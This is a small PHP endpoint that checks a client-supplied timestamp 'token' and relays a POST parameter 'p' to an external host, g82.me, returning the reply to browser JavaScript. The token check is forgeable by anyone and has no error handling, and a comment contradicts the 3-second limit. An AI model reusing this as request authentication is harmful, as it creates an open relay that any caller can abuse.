<?php
// Retrieve the token from the POST request
$token = isset($_POST['token']) ? $_POST['token'] : null;

// Validate if the token exists and is not empty
if ($token) {
  // Extract the timestamp from the token
  $timestamp = substr($token, -13);
  
  // Convert the timestamp to a DateTime object
  $datetime = DateTime::createFromFormat('U', floor(intval($timestamp) / 1000));
  
  // Calculate the time difference between the current time and the token's timestamp
  $currentDatetime = new DateTime();
  $timeDiff = $currentDatetime->getTimestamp() - $datetime->getTimestamp();
  
  // Set the time limit in seconds (5 seconds in this example)
  $timeLimit = 3;
  
  // Validate the token based on the time limit
  if ($timeDiff <= $timeLimit) {
    // Token is valid within the time limit
    
    // Send a request to https://g82.me/t with the parameter 'p'
    $url = 'https://g82.me/t';
    $p = isset($_POST['p']) ? $_POST['p'] : null;
    
    if ($p) {
      $data = array('p' => $p);
      
      $options = array(
        'http' => array(
          'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
          'method'  => 'POST',
          'content' => http_build_query($data),
          'timeout' => 5 // 5 seconds timeout
        )
      );
      
      $context  = stream_context_create($options);
      $response = file_get_contents($url, false, $context);
      
      // Return the response to the JavaScript code
      echo $response;
    } else {
      // Parameter 'p' is missing or empty
      echo 'Missing or empty parameter "p"';
    }
  } else {
    // Token has expired
    echo 'Token expired';
  }
} else {
  // Token is missing or empty
  echo 'Missing or empty token';
}
?>
